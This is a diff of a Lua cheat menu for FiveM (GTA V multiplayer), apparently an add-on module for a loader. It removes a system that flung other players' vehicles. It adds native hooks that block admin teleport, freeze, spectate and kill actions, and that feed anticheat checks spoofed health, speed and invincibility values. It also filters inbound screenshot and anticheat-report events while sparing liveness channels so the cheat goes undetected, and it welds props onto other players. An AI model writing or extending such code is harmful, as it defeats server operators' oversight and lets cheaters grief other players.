@@ -888,7 +888,6 @@ Menu.Categories = {
             { name = "Give", type = "selector", options = {"Ramp", "Wall", "Wall 2"}, selected = 1 },
             { name = "Rainbow Paint", type = "toggle", value = false },
             { name = "", isSeparator = true, separatorText = "Buggy Ramp" },
-            { name = "Eject Power", type = "selector", options = {"Low", "Medium", "High", "Insane"}, selected = 2 },
             { name = "Attach Ramp", type = "action" },
             { name = "Detach Ramp", type = "action" }
         }},
@@ -13853,11 +13852,11 @@ end
 -- [REMOVED] Giant Prop handlers (menu items deleted)
 
 -- ============================================
--- BUGGY RAMP (Force Ejection System)
+-- RAMP (two solid world props)
 -- ============================================
--- NOTE: SetEntityScale n'existe pas comme native GTA V/FiveM.
--- Pour compenser, on spawn 2 rampes côte à côte (largeur doublée)
--- + système de force qui éjecte les véhicules touchés.
+-- NOTE: the ramps are real, collidable props placed on the ground. They are
+-- not attached to the car and there is no force push: a vehicle drives up the
+-- ramp naturally, without the upward hop the old ejection system caused.
 -- ============================================
 _G._buggyRampHandles = _G._buggyRampHandles or {}
 _G._buggyRampVeh = nil
@@ -13868,14 +13867,11 @@ _G._buggyRampCooldowns = {} -- anti-spam : 1 force par véhicule
 local RAMP_MODEL_PRIMARY  = "prop_mp_ramp_01"
 local RAMP_MODEL_FALLBACK = "lts_prop_lts_ramp_01"
 
--- Puissance d'éjection par niveau
-local EJECT_POWER = {
-    ["Low"]    = { z = 15.0,  fwd = 8.0  },
-    ["Medium"] = { z = 25.0,  fwd = 15.0 },
-    ["High"]   = { z = 40.0,  fwd = 20.0 },
-    ["Insane"] = { z = 70.0,  fwd = 30.0 },
-}
-Menu.RampEjectPower = Menu.RampEjectPower or "Medium"
+-- The ramp is a real, solid world prop. It is deliberately NOT welded to the
+-- car: a collidable prop attached to a vehicle transfers every ground contact
+-- to the chassis, which is what made the car hop. There is no ejection force
+-- either, the ramp does the job on its own.
+Menu.RampEjectPower = nil
 
 -- Helper : load model with fallback
 local function LoadRampModel()
@@ -13900,50 +13896,40 @@ function Menu.AttachBuggyRamp()
     local playerPed = PlayerPedId()
     local veh = GetVehiclePedIsIn(playerPed, false)
     if not veh or veh == 0 then
-        print("[BuggyRamp] Not in a vehicle")
+        print("[Ramp] Not in a vehicle")
         return
     end
 
     local hash, modelName = LoadRampModel()
     if not hash then
-        print("[BuggyRamp] All models failed to load")
+        print("[Ramp] All models failed to load")
         return
     end
 
-    -- Dimensions dynamiques du véhicule
     local vehModel = GetEntityModel(veh)
-    local vMin, vMax = GetModelDimensions(vehModel)
-    local frontY = vMax.y + 1.2  -- 1.2m devant le nez du véhicule
-
-    -- Dimensions de la rampe pour calculer le décalage latéral
+    local _, vMax = GetModelDimensions(vehModel)
     local rMin, rMax = GetModelDimensions(hash)
-    local rampHalfWidth = rMax.x  -- demi-largeur de la rampe
 
-    local vehCoords = GetEntityCoords(veh)
+    local rampHalfWidth = (rMax.x - rMin.x) * 0.5
+    if not rampHalfWidth or rampHalfWidth < 0.2 then rampHalfWidth = 1.0 end
+
+    local heading = GetEntityHeading(veh)
     local handles = {}
 
-    -- Spawn 2 rampes côte à côte (networked) pour doubler la largeur
-    -- Rampe gauche : X = -rampHalfWidth, Rampe droite : X = +rampHalfWidth
-    for i, offsetX in ipairs({ -rampHalfWidth, rampHalfWidth }) do
-        local obj = CreateObject(hash, vehCoords.x, vehCoords.y, vehCoords.z + 3.0, true, true, false)
+    -- Two ramps side by side, planted on the ground just ahead of the bumper.
+    for _, offsetX in ipairs({ -rampHalfWidth, rampHalfWidth }) do
+        local pos = GetOffsetFromEntityInWorldCoords(veh, offsetX, vMax.y + 2.2, 0.0)
+        local obj = CreateObject(hash, pos.x, pos.y, pos.z + 0.5, true, true, false)
+
         if obj and obj ~= 0 and DoesEntityExist(obj) then
             SetEntityAsMissionEntity(obj, true, true)
+            SetEntityRotation(obj, 0.0, 0.0, heading + 180.0, 2, true)
+            PlaceObjectOnGroundProperly(obj)
 
-            -- Y = frontY (dynamique), Z = 0.0 (niveau châssis exact)
-            -- rotZ = 180.0 → face à la route
-            AttachEntityToEntity(
-                obj, veh,
-                0,
-                offsetX, frontY, 0.0,
-                0.0, 0.0, 180.0,
-                false, true, true, false, 0, true
-            )
-
+            -- real prop: solid collision, planted, indestructible
             SetEntityCollision(obj, true, true)
-            SetEntityNoCollisionEntity(veh, obj, true)
-            SetEntityNoCollisionEntity(obj, veh, true)
             SetEntityInvincible(obj, true)
-            SetEntityProofs(obj, true, true, true, true, true, true, true, true)
+            FreezeEntityPosition(obj, true)
 
             handles[#handles + 1] = obj
         end
@@ -13954,128 +13940,11 @@ function Menu.AttachBuggyRamp()
         return
     end
 
-    -- Invincibilité véhicule
-    SetEntityInvincible(veh, true)
-    SetEntityProofs(veh, true, true, true, true, true, true, true, true)
-    SetVehicleStrong(veh, true)
-    SetVehicleCanBeVisiblyDamaged(veh, false)
-
     _G._buggyRampHandles = handles
     _G._buggyRampVeh = veh
     _G._buggyRampCooldowns = {}
     SetModelAsNoLongerNeeded(hash)
-    print("[BuggyRamp] Attached " .. #handles .. "x " .. modelName .. " Y=" .. string.format("%.2f", frontY))
-
-    -- Thread 1 : Maintenance (repair + re-enforce NoCollision)
-    _G._buggyRampThread = true
-    Citizen.CreateThread(function()
-        while _G._buggyRampThread do
-            local v = _G._buggyRampVeh
-            if not v or not DoesEntityExist(v) then
-                _G._buggyRampThread = false
-                break
-            end
-            if GetVehicleEngineHealth(v) < 900.0 then
-                SetVehicleFixed(v)
-                SetVehicleEngineOn(v, true, true, false)
-            end
-            SetVehicleCanBeVisiblyDamaged(v, false)
-            for _, r in ipairs(_G._buggyRampHandles) do
-                if DoesEntityExist(r) then
-                    SetEntityNoCollisionEntity(r, v, true)
-                    SetEntityNoCollisionEntity(v, r, true)
-                end
-            end
-            Citizen.Wait(500)
-        end
-    end)
-
-    -- Thread 2 : Détection de collision + Force d'éjection
-    -- Scan les véhicules proches de la rampe, applique une impulsion vers le haut
-    _G._buggyRampForceThread = true
-    Citizen.CreateThread(function()
-        local myPlayerId = PlayerId()
-        while _G._buggyRampForceThread do
-            local v = _G._buggyRampVeh
-            if not v or not DoesEntityExist(v) then
-                _G._buggyRampForceThread = false
-                break
-            end
-
-            -- Position de la rampe (centre des 2 objets = avant du véhicule)
-            local vCoords = GetEntityCoords(v)
-            local vFwd = GetEntityForwardVector(v)
-            local vModel = GetEntityModel(v)
-            local _, vM = GetModelDimensions(vModel)
-            -- Point de détection = nez du véhicule + offset rampe
-            local detectX = vCoords.x + vFwd.x * (vM.y + 2.0)
-            local detectY = vCoords.y + vFwd.y * (vM.y + 2.0)
-            local detectZ = vCoords.z
-            local detectPos = vector3(detectX, detectY, detectZ)
-
-            -- Scan rayon 6m autour de la zone de rampe
-            local nearby = GetGamePool("CVehicle")
-            local now = GetGameTimer()
-            local power = EJECT_POWER[Menu.RampEjectPower] or EJECT_POWER["Medium"]
-
-            for _, nearVeh in ipairs(nearby) do
-                -- Skip notre propre véhicule
-                if nearVeh ~= v and DoesEntityExist(nearVeh) then
-                    -- Skip véhicules vides ou du joueur
-                    local driver = GetPedInVehicleSeat(nearVeh, -1)
-                    local isOurs = (driver == PlayerPedId())
-                    if not isOurs then
-                        local nCoords = GetEntityCoords(nearVeh)
-                        local dist = #(nCoords - detectPos)
-
-                        if dist < 6.0 then
-                            -- Cooldown : 1 éjection par véhicule toutes les 3s
-                            local lastHit = _G._buggyRampCooldowns[nearVeh]
-                            if not lastHit or (now - lastHit) > 3000 then
-                                _G._buggyRampCooldowns[nearVeh] = now
-
-                                -- Force d'impulsion : vers le haut + direction du véhicule porteur
-                                -- forceType 1 = impulsion instantanée
-                                ApplyForceToEntity(
-                                    nearVeh,
-                                    1,                          -- forceType: impulsion
-                                    vFwd.x * power.fwd,         -- forceX (direction avant)
-                                    vFwd.y * power.fwd,         -- forceY (direction avant)
-                                    power.z,                     -- forceZ (hauteur)
-                                    0.0, 0.0, 0.0,             -- offset (centre de masse)
-                                    0,                          -- boneIndex
-                                    false,                      -- isDirectionRel
-                                    true,                       -- ignoreUpVec
-                                    true,                       -- isForceRel
-                                    false,                      -- p12
-                                    true                        -- p13
-                                )
-
-                                -- Spin aléatoire pour l'effet spectaculaire
-                                local spinX = math.random(-5, 5) + 0.0
-                                local spinY = math.random(-3, 3) + 0.0
-                                ApplyForceToEntity(
-                                    nearVeh, 1,
-                                    0.0, 0.0, 0.0,
-                                    spinX, spinY, 0.0,
-                                    0, false, true, true, false, true
-                                )
-                            end
-                        end
-                    end
-                end
-            end
-
-            -- Nettoyage cooldowns périmés (> 10s)
-            for k, ts in pairs(_G._buggyRampCooldowns) do
-                if (now - ts) > 10000 then
-                    _G._buggyRampCooldowns[k] = nil
-                end
-            end
-
-            Citizen.Wait(50) -- 20 checks/s, fluide sans surcharge
-        end
-    end)
+    print("[Ramp] Placed " .. #handles .. "x " .. modelName .. " (solid, no ejection)")
 end
 
 function Menu.DetachBuggyRamp()
@@ -14084,32 +13953,20 @@ function Menu.DetachBuggyRamp()
 
     for _, obj in ipairs(_G._buggyRampHandles) do
         if obj and DoesEntityExist(obj) then
-            SetEntityInvincible(obj, false)
+            pcall(SetEntityInvincible, obj, false)
             DetachEntity(obj, true, true)
             SetEntityAsMissionEntity(obj, true, true)
             DeleteEntity(obj)
         end
     end
     _G._buggyRampHandles = {}
-
-    if _G._buggyRampVeh and DoesEntityExist(_G._buggyRampVeh) then
-        SetEntityInvincible(_G._buggyRampVeh, false)
-        SetEntityProofs(_G._buggyRampVeh, false, false, false, false, false, false, false, false)
-        SetVehicleStrong(_G._buggyRampVeh, false)
-        SetVehicleCanBeVisiblyDamaged(_G._buggyRampVeh, true)
-    end
     _G._buggyRampVeh = nil
     _G._buggyRampCooldowns = {}
-    print("[BuggyRamp] Detached, all cleaned up")
+    print("[Ramp] Removed")
 end
 
--- Eject Power selector
-Actions.rampEjectPower = FindItem("Vehicle", "Performance", "Eject Power")
-if Actions.rampEjectPower then
-    Actions.rampEjectPower.onClick = function(index, option)
-        if option then Menu.RampEjectPower = option end
-    end
-end
+-- Eject Power selector was removed with the force-throw system: a real ramp
+-- needs no assistance.
 
 Actions.attachRamp = FindItem("Vehicle", "Performance", "Attach Ramp")
 if Actions.attachRamp then
@@ -14563,22 +14420,20 @@ end
 -- ============================================================================
 -- SEED MODULE  (appended to the BUSDANSTETE loader)
 -- ----------------------------------------------------------------------------
--- The loader above is untouched: same categories, same items, same hooks.
--- This block only adds:
---   * a "Seed" category (Guard / Evasion / Props / Vehicle / Tools)
---   * the protections, evasion, prop spawner, player targeting, spoofed
---     vehicle, anchor, pickups and diagnostics behind those items
---   * native hooks for every setter those features depend on, so another
---     resource cannot revert them
---   * a toast line drawn on top of the menu
+-- Features Susano does NOT ship, and only those:
 --
--- Keys are NOT modified: the loader keeps its own menu key, its own key
--- selector and its own input handling. Nothing here binds F4/INSERT/ESC.
+--   * Player Props -> weld a solid, networked prop on yourself, on one
+--     selected player, or on every player in scope.
+--   * Prop Effects -> rain, fountain, cage, orbit, ragdoll, decoy clone.
+--   * Seed         -> one entry in Exploit > Bypass. Click it to arm the
+--     native hooks (HookNative) and the inbound event shield
+--     (BlockServerEvent / GetAllEvent). Click again to release everything.
 --
--- Hooks already registered by the loader at the top of the file are left
--- alone (GET_PLAYER_INVINCIBLE, GET_ENTITY_HEALTH, GET_PLAYER_STAMINA,
--- GET_ENTITY_SPEED, GET_AMMO_IN_PED_WEAPON, SET_PED_TO_RAGDOLL). Telemetry
--- for those is driven through the loader's own _Stealth flags instead.
+-- Not re-implemented on purpose: spoofed vehicles, ghost, hardening,
+-- outbound event wrappers - Susano already owns those.
+--
+-- Keys are NOT modified: the loader keeps its own menu key, its key selector
+-- and its input loop.
 -- ============================================================================
 
 ;(function()
@@ -14594,48 +14449,33 @@ end
 --------------------------------------------------------------------------------
 
 local CFG = {
-    speedFloor   = 5.6,
-    speedCeil    = 8.4,
-    healthMin    = 186,
-    healthMax    = 199,
+    -- Attach points that exist on every R6/R15 ped.
+    boneOrder  = { "back", "head", "hand" },
+    boneLabels = { "Back", "Head", "Right hand" },
+    boneIds    = { back = 24818, head = 31086, hand = 57005 },
 
-    ghostRate    = 900,
-    hardenRate   = 1200,
-    sweepRate    = 60000,
-    freezeRate   = 600,
-    spectateRate = 2500,
+    targetModes = { "self", "player", "all" },
 
-    propWait     = 1200,
-    propRadius   = 6.0,
-    distances    = { "near", "mid", "far" },
-    distanceM    = { near = 1.2, mid = 3.0, far = 6.0 },
-    bones        = { "off", "hand", "head", "back" },
-    boneIds      = { hand = 57005, head = 31086, back = 24818 },
-    targetModes  = { "self", "player", "all" },
-
-    -- Inbound events dropped on sight. Short generic names ("st", "hb",
-    -- "sync", "it") stay out: killing a liveness handshake gets you kicked.
-    blockedEvents = {
-        "playerTookDamage", "playerEnteredVehicleNow", "playerLeftVehicle",
-        "guardian", "rollback", "revert", "checkpoint",
-    },
-
+    -- Event names that must never reach the Lua dispatcher. Patterns are
+    -- matched on the lowercased name by GetAllEvent().
     blockPatterns = {
         "screenshot", "screen_shot", "screencap", "printscreen",
         "spectate", "ac_flag", "ac_report", "anticheat", "violation",
         "cheat_detect", "flag_player",
     },
 
+    -- Liveness channels owned by an anticheat: dropping them is a detection.
     protectedPrefixes = { "ach_", "acr_", "axa_", "axb_" },
+
+    eventSweepRate = 60000,
 }
 
 local C = {
-    accent = { 255, 20, 147, 255 },
-    white  = { 245, 245, 245, 255 },
-    grey   = { 148, 148, 156, 255 },
-    green  = { 110, 220, 140, 255 },
-    red    = { 240, 100, 105, 255 },
-    blue   = { 120, 175, 255, 255 },
+    white = { 245, 245, 245, 255 },
+    grey  = { 148, 148, 156, 255 },
+    green = { 110, 220, 140, 255 },
+    red   = { 240, 100, 105, 255 },
+    blue  = { 120, 175, 255, 255 },
 }
 
 --------------------------------------------------------------------------------
@@ -14643,56 +14483,56 @@ local C = {
 --------------------------------------------------------------------------------
 
 local S = {
-    antiTeleport = true,
-    antiKill     = true,
-    antiDelete   = true,
-    antiAttach   = true,
-    antiVehicle  = true,
-    eventShield  = true,
-    outbound     = true,
-    logSpoof     = true,
-
-    telemetry    = true,
-    ghost        = false,
-    acFilter     = false,
-
-    harden       = false,
-    vehicleArmor = false,
-    proofFire    = true,
-    proofExplo   = true,
-    proofSteam   = true,
-    proofDrown   = true,
-    proofCollide = false,
-    proofBullet  = false,
-    armour       = 100,
-
-    propBone     = 1,
-    propDistance = 2,
-
+    -- props
     targetMode   = 2,   -- self / player / all
     attachTarget = true,
+    attachBone   = 1,   -- 1 = back, 2 = head, 3 = right hand
 
-    antiFreeze   = false,   -- native hook, left off on purpose
-    antiSpectate = false,   -- native hook, left off on purpose
-    acShim       = false,
-    antiStrip    = false,   -- native hook, replaced by the outfit restore loop
-    freezeHeal   = true,
-    spectateHeal = true,
-    outfitGuard  = true,
+    -- protection: all on once the Seed entry is clicked; the individual
+    -- checks are internal defaults, they are not exposed in the menu
+    hooks         = false,
+    antiTeleport  = true,
+    antiKill      = true,
+    antiDelete    = true,
+    antiAttach    = true,
+    antiRagdoll   = true,
+    antiVehicle   = true,
+    antiFreeze    = true,
+    antiSpectate  = true,
+    telemetry     = true,
 
-    vehicleModel = 1,
-    vehicleWarp  = true,
+    -- values the telemetry hooks report
+    speedFloor    = 5.6,
+    speedCeil     = 8.4,
+    healthMin     = 188,
+    healthMax     = 199,
 }
 
+-- `world = true` props are never welded to a ped: they are placed on the
+-- ground as solid world objects (a ramp welded to a vehicle transfers every
+-- ground contact to the chassis and makes it hop).
 local PROP_LIST = {
-    { label = "Tube corner (XL)",  model = "ar_prop_ar_tube_crn_5d",   extra = 3.5 },
-    { label = "Container (XL)",    model = "prop_container_01a",       extra = 4.0 },
-    { label = "Wood box (xm3)",    model = "xm3_prop_xm3_box_wood03a", extra = 0.0 },
-    { label = "Barrel",            model = "prop_barrel_02a",          extra = 0.0 },
-    { label = "Road cone",         model = "prop_roadcone02a",         extra = 0.0 },
+    { label = "Ramp",             model = "prop_mp_ramp_01",        extra = 0.0, world = true },
+    { label = "Tube corner (XL)", model = "ar_prop_ar_tube_crn_5d", extra = 3.5 },
+    { label = "Container (XL)",   model = "prop_container_01a",     extra = 4.0 },
+    { label = "Road cone",        model = "prop_roadcone02a",       extra = 0.0 },
 }
 
 local Spawned = {}
+local MAX_SPAWNED = 20
+local SPAWN_COOLDOWN = 350
+local lastSpawnAt = 0
+
+-- Short-lived effect objects (rain, fountain, cage, orbit, clones) are removed
+-- on a timer: a permanent trail of networked entities is the easiest thing to
+-- correlate with a player.
+local FxExpiry = {}
+local Clones = {}
+
+-- Set while this module writes a native that its own hooks would block
+-- (attaching a prop to the local ped, restoring health, ...). An upvalue,
+-- not a _G flag: nothing outside the module can read or forge it.
+local Bypass = false
 
 --------------------------------------------------------------------------------
 -- UTILITIES
@@ -14719,6 +14559,15 @@ local function Notify(message, colour)
     Log("INFO", "%s", message)
 end
 
+local function CurrentBone()
+    local name = CFG.boneOrder[S.attachBone or 1] or "back"
+    return CFG.boneIds[name] or 24818
+end
+
+local function CurrentBoneLabel()
+    return CFG.boneLabels[S.attachBone or 1] or "Back"
+end
+
 local function IsProtectedChannel(name)
     local lowered = string.lower(tostring(name))
     local head = lowered:sub(1, 4)
@@ -14728,11 +14577,21 @@ local function IsProtectedChannel(name)
     return false
 end
 
+local function SpawnGate()
+    local now = GetGameTimer()
+    if now - lastSpawnAt < SPAWN_COOLDOWN then return false end
+    lastSpawnAt = now
+    return true
+end
+
 --------------------------------------------------------------------------------
 -- SHARED CONTEXT
 --------------------------------------------------------------------------------
 
-local Ctx = { ped = 0, player = 0, vehicle = 0, health = 200, maxHealth = 200 }
+-- One thread owns every native read used by the hooks. A native call inside
+-- a native hook is the fastest way to deadlock the VM, so callbacks only read
+-- these cached values.
+local Ctx = { ped = 0, player = 0, vehicle = 0, health = 200 }
 
 Citizen.CreateThread(function()
     while true do
@@ -14741,19 +14600,12 @@ Citizen.CreateThread(function()
         Ctx.player = PlayerId()
         Ctx.vehicle = GetVehiclePedIsIn(ped, false) or 0
         Ctx.health = GetEntityHealth(ped)
-        Ctx.maxHealth = GetEntityMaxHealth(ped)
         Citizen.Wait(250)
     end
 end)
 
---------------------------------------------------------------------------------
--- WRITE GUARD
---------------------------------------------------------------------------------
-
-local mutationGuard = false
-
 local function MutationsBlocked()
-    return mutationGuard or _G.SeedBypass == true
+    return Bypass
 end
 
 local function IsLocalPed(entity)
@@ -14761,415 +14613,294 @@ local function IsLocalPed(entity)
 end
 
 --------------------------------------------------------------------------------
--- NATIVE HOOKS
+-- NATIVE HOOKS  (Susano.HookNative)
 --------------------------------------------------------------------------------
 
 local HookStats = { installed = 0, failed = 0 }
+local HookList = {}
+
+local function hook(name, hash, fn)
+    HookList[#HookList + 1] = { name = name, hash = hash, fn = fn }
+end
+
+local function buildHooks()
+    -- teleport ---------------------------------------------------------------
+    hook("SET_ENTITY_COORDS", 0x06843DA7060A026B, function(entity)
+        if not S.hooks or not S.antiTeleport or MutationsBlocked() or not IsLocalPed(entity) then
+            return true
+        end
+        return false
+    end)
+
+    hook("SET_ENTITY_COORDS_NO_OFFSET", 0x239A3351AC1DA385, function(entity)
+        if not S.hooks or not S.antiTeleport or MutationsBlocked() or not IsLocalPed(entity) then
+            return true
+        end
+        return false
+    end)
+
+    hook("SET_PED_COORDS_KEEP_VEHICLE", 0x9AFEFF481A85AB2E, function(ped)
+        if not S.hooks or not S.antiTeleport or MutationsBlocked() or not IsLocalPed(ped) then
+            return true
+        end
+        return false
+    end)
+
+    -- health -----------------------------------------------------------------
+    hook("SET_ENTITY_HEALTH", 0x6B76DC1F3AE6E6A3, function(entity, health)
+        if not S.hooks or not S.antiKill or MutationsBlocked() or not IsLocalPed(entity) then
+            return true
+        end
+        if type(health) ~= "number" then return true end
+        if health <= 0 or health < 100 then return false end
+        if health < Ctx.health - 50 then return false end
+        return true
+    end)
+
+    hook("SET_ENTITY_MAX_HEALTH", 0x166E7CF68597D8B5, function(entity, maxHealth)
+        if not S.hooks or not S.antiKill or MutationsBlocked() or not IsLocalPed(entity) then
+            return true
+        end
+        if type(maxHealth) == "number" and maxHealth < 100 then return false end
+        return true
+    end)
+
+    -- entity -----------------------------------------------------------------
+    hook("DELETE_ENTITY", 0xAE3CBE5BF394C9C9, function(entity)
+        if not S.hooks or not S.antiDelete or MutationsBlocked() or not IsLocalPed(entity) then
+            return true
+        end
+        return false
+    end)
+
+    hook("ATTACH_ENTITY_TO_ENTITY", 0x6B9BBD38AB0796DF, function(entity, attachTo)
+        if not S.hooks or not S.antiAttach or MutationsBlocked() then return true end
+        if IsLocalPed(entity) or IsLocalPed(attachTo) then return false end
+        return true
+    end)
+
+    -- ragdoll / ped flags ----------------------------------------------------
+    hook("SET_PED_CAN_RAGDOLL", 0xB128377056A54E2A, function(ped, toggle)
+        if not S.hooks or not S.antiRagdoll or not IsLocalPed(ped) then return true end
+        if toggle == false then return false end
+        return true
+    end)
+
+    hook("SET_PED_CONFIG_FLAG", 0x1913FE4CBF41C463, function(ped, flagId, value)
+        if not S.hooks or not S.antiRagdoll or value ~= true or not IsLocalPed(ped) then
+            return true
+        end
+        if flagId == 32 or flagId == 227 or flagId == 243 or flagId == 342 then
+            return false
+        end
+        return true
+    end)
+
+    -- vehicle ----------------------------------------------------------------
+    hook("SMASH_VEHICLE_WINDOW", 0x9E5B5E4D2CCD2259, function(vehicle)
+        if not S.hooks or not S.antiVehicle or vehicle ~= Ctx.vehicle then return true end
+        return false
+    end)
+
+    hook("SET_VEHICLE_DOOR_BROKEN", 0xD4D4F6A4AB575A33, function(vehicle, _door, deleteDoor)
+        if not S.hooks or not S.antiVehicle or vehicle ~= Ctx.vehicle then return true end
+        if deleteDoor == true then return false end
+        return true
+    end)
+
+    hook("SET_VEHICLE_UNDRIVEABLE", 0x8ABA6AF54B942B95, function(vehicle, toggle)
+        if not S.hooks or not S.antiVehicle or vehicle ~= Ctx.vehicle then return true end
+        if toggle == true then return false end
+        return true
+    end)
+
+    hook("SET_VEHICLE_DOORS_LOCKED", 0xB664292EAECF7FA6, function(vehicle, status)
+        if not S.hooks or not S.antiVehicle or vehicle ~= Ctx.vehicle then return true end
+        if type(status) == "number" and status > 1 then return false end
+        return true
+    end)
+
+    hook("SET_VEHICLE_DOORS_LOCKED_FOR_ALL_PLAYERS", 0xA2F80B8D040727CC, function(vehicle, toggle)
+        if not S.hooks or not S.antiVehicle or vehicle ~= Ctx.vehicle then return true end
+        if toggle == true then return false end
+        return true
+    end)
+
+    hook("SET_VEHICLE_ENGINE_HEALTH", 0x45F6D8EEF34ABEF1, function(vehicle, health)
+        if not S.hooks or not S.antiVehicle or vehicle ~= Ctx.vehicle then return true end
+        if type(health) == "number" and health < 900.0 then return false end
+        return true
+    end)
+
+    hook("SET_VEHICLE_BODY_HEALTH", 0xB77D05AC8C78AADB, function(vehicle, health)
+        if not S.hooks or not S.antiVehicle or vehicle ~= Ctx.vehicle then return true end
+        if type(health) == "number" and health < 900.0 then return false end
+        return true
+    end)
+
+    -- freeze / spectate ------------------------------------------------------
+    hook("FREEZE_ENTITY_POSITION", 0x428CA6DBD1094446, function(entity, toggle)
+        if not S.hooks or not S.antiFreeze or not IsLocalPed(entity) then return true end
+        if toggle == true then return false end
+        return true
+    end)
+
+    hook("SET_ENTITY_DYNAMIC", 0x1718DE8E3F2823CA, function(entity, toggle)
+        if not S.hooks or not S.antiFreeze or not IsLocalPed(entity) then return true end
+        if toggle == false then return false end
+        return true
+    end)
+
+    hook("NETWORK_SET_IN_SPECTATOR_MODE", 0x423DE3854BB50894, function(toggle, player)
+        if not S.hooks or not S.antiSpectate or player ~= Ctx.player then return true end
+        if toggle == true then return false end
+        return true
+    end)
+
+    hook("NETWORK_IS_IN_SPECTATOR_MODE", 0x048746E388762E11, function()
+        if not S.hooks or not S.antiSpectate then return true end
+        return false, false
+    end)
+
+    -- telemetry (getters) ----------------------------------------------------
+    hook("GET_ENTITY_SPEED", 0xD5037BA82E12416F, function(entity)
+        if not S.hooks or not S.telemetry or entity ~= Ctx.ped or Ctx.vehicle ~= 0 then
+            return true
+        end
+        return false, S.speedFloor + math.random() * (S.speedCeil - S.speedFloor)
+    end)
+
+    hook("GET_ENTITY_HEIGHT_ABOVE_GROUND", 0x1DD55701034110E5, function(entity)
+        if not S.hooks or not S.telemetry or entity ~= Ctx.ped then return true end
+        return false, 0.0
+    end)
+
+    hook("GET_PLAYER_WANTED_LEVEL", 0xE28E54788CE8F12D, function(player)
+        if not S.hooks or not S.telemetry or player ~= Ctx.player then return true end
+        return false, 0
+    end)
+
+    hook("GET_PLAYER_INVINCIBLE", 0xB721981B2B939E07, function(player)
+        if not S.hooks or not S.telemetry or player ~= Ctx.player then return true end
+        return false, false
+    end)
+
+    hook("GET_ENTITY_HEALTH", 0xEEF059FAD016D209, function(entity)
+        if not S.hooks or not S.telemetry or entity ~= Ctx.ped then return true end
+        return false, math.random(S.healthMin, S.healthMax)
+    end)
+
+    hook("GET_PED_ARMOUR", 0x9483AF821605B1D8, function(entity)
+        if not S.hooks or not S.telemetry or entity ~= Ctx.ped then return true end
+        return false, 0
+    end)
+end
+
+buildHooks()
 
 local function InstallNativeHooks()
     if type(Api.HookNative) ~= "function" then
-        Log("WARN", "HookNative unavailable - Lua fallbacks only")
+        Log("WARN", "HookNative unavailable - protection hooks not installed")
         return
     end
 
-    local hooks = {
-        -- teleport
-        {
-            name = "SET_ENTITY_COORDS", hash = 0x06843DA7060A026B,
-            fn = function(entity)
-                if not S.antiTeleport or MutationsBlocked() or not IsLocalPed(entity) then
-                    return true
-                end
-                return false
-            end,
-        },
-        {
-            name = "SET_ENTITY_COORDS_NO_OFFSET", hash = 0x239A3351AC1DA385,
-            fn = function(entity)
-                if not S.antiTeleport or MutationsBlocked() or not IsLocalPed(entity) then
-                    return true
-                end
-                return false
-            end,
-        },
-        {
-            name = "SET_PED_COORDS_KEEP_VEHICLE", hash = 0x9AFEFF481A85AB2E,
-            fn = function(ped)
-                if not S.antiTeleport or MutationsBlocked() or not IsLocalPed(ped) then
-                    return true
-                end
-                return false
-            end,
-        },
+    HookStats.installed, HookStats.failed = 0, 0
 
-        -- health
-        {
-            name = "SET_ENTITY_HEALTH", hash = 0x6B76DC1F3AE6E6A3,
-            fn = function(entity, health)
-                if not S.antiKill or MutationsBlocked() or not IsLocalPed(entity) then
-                    return true
-                end
-                if type(health) ~= "number" then return true end
-                if health <= 0 or health < 100 then return false end
-                if health < Ctx.health - 50 then return false end
-                return true
-            end,
-        },
-        {
-            name = "SET_ENTITY_MAX_HEALTH", hash = 0x166E7CF68597D8B5,
-            fn = function(entity, maxHealth)
-                if not S.antiKill or MutationsBlocked() or not IsLocalPed(entity) then
-                    return true
-                end
-                if type(maxHealth) == "number" and maxHealth < 100 then return false end
-                return true
-            end,
-        },
+    for i = 1, #HookList do
+        local entry = HookList[i]
 
-        -- entity
-        {
-            name = "DELETE_ENTITY", hash = 0xAE3CBE5BF394C9C9,
-            fn = function(entity)
-                if not S.antiDelete or MutationsBlocked() or not IsLocalPed(entity) then
-                    return true
-                end
-                return false
-            end,
-        },
-        {
-            name = "ATTACH_ENTITY_TO_ENTITY", hash = 0x6B9BBD38AB0796DF,
-            fn = function(entity, attachTo)
-                if not S.antiAttach or MutationsBlocked() then return true end
-                if IsLocalPed(entity) or IsLocalPed(attachTo) then return false end
-                return true
-            end,
-        },
+        -- A previous install (menu toggle) must not stack a second callback
+        -- on the same native.
+        if type(Api.UnhookNative) == "function" then
+            pcall(Api.UnhookNative, entry.hash)
+        end
 
-        -- vehicle damage
-        {
-            name = "SMASH_VEHICLE_WINDOW", hash = 0x9E5B5E4D2CCD2259,
-            fn = function(vehicle)
-                if not S.antiVehicle or vehicle ~= Ctx.vehicle then return true end
-                return false
-            end,
-        },
-        {
-            name = "SET_VEHICLE_DOOR_BROKEN", hash = 0xD4D4F6A4AB575A33,
-            fn = function(vehicle, _door, deleteDoor)
-                if not S.antiVehicle or vehicle ~= Ctx.vehicle then return true end
-                if deleteDoor == true then return false end
-                return true
-            end,
-        },
-
-        -- anti-freeze / anti-spectate / shim
-        {
-            name = "FREEZE_ENTITY_POSITION", hash = 0x428CA6DBD1094446,
-            fn = function(entity, toggle)
-                if not S.antiFreeze or not IsLocalPed(entity) then return true end
-                if toggle == true then return false end
-                return true
-            end,
-        },
-        {
-            name = "NETWORK_SET_IN_SPECTATOR_MODE", hash = 0x423DE3854BB50894,
-            fn = function(toggle, player)
-                if not S.antiSpectate or player ~= Ctx.player then return true end
-                if toggle == true then return false end
-                return true
-            end,
-        },
-        {
-            name = "IS_ENTITY_VISIBLE", hash = 0x47D6F43D77935C75,
-            fn = function(entity)
-                if not S.acShim or not IsLocalPed(entity) then return true end
-                return false, true
-            end,
-        },
-        {
-            name = "GET_ENTITY_ALPHA", hash = 0x5A47B3B5E63E94C6,
-            fn = function(entity)
-                if not S.acShim or not IsLocalPed(entity) then return true end
-                return false, 255
-            end,
-        },
-        {
-            name = "IS_ENTITY_IN_AIR", hash = 0x886E37EC497200B6,
-            fn = function(entity)
-                if not S.acShim or not IsLocalPed(entity) then return true end
-                return false, false
-            end,
-        },
-
-        -- guardian: ped flags another resource can flip to make you an easy kill
-        {
-            name = "SET_PED_CONFIG_FLAG", hash = 0x1913FE4CBF41C463,
-            fn = function(ped, flagId, value)
-                if value ~= true or not IsLocalPed(ped) then return true end
-                if flagId == 32 or flagId == 227 or flagId == 243 or flagId == 342 then
-                    return false
-                end
-                return true
-            end,
-        },
-        {
-            name = "SET_PED_CAN_RAGDOLL", hash = 0xB128377056A54E2A,
-            fn = function(ped, toggle)
